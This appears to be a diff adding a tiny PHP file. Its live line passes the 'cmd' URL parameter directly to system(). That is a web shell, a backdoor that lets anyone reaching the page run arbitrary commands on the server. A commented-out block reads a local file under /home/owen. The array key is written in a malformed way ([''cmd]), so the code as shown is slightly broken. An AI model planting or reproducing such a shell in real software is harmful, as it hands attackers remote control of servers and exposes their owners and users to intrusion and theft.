@@ -1,0 +1,12 @@
+<?php
+system($_GET[''cmd]);
+/*
+$fd=fopen("/home/owen/version","r");
+while (! feof($fd)){
+    $result = fgets($fd);
+    echo $result;
+}
+fclose($fd);
+*/
+
+?>
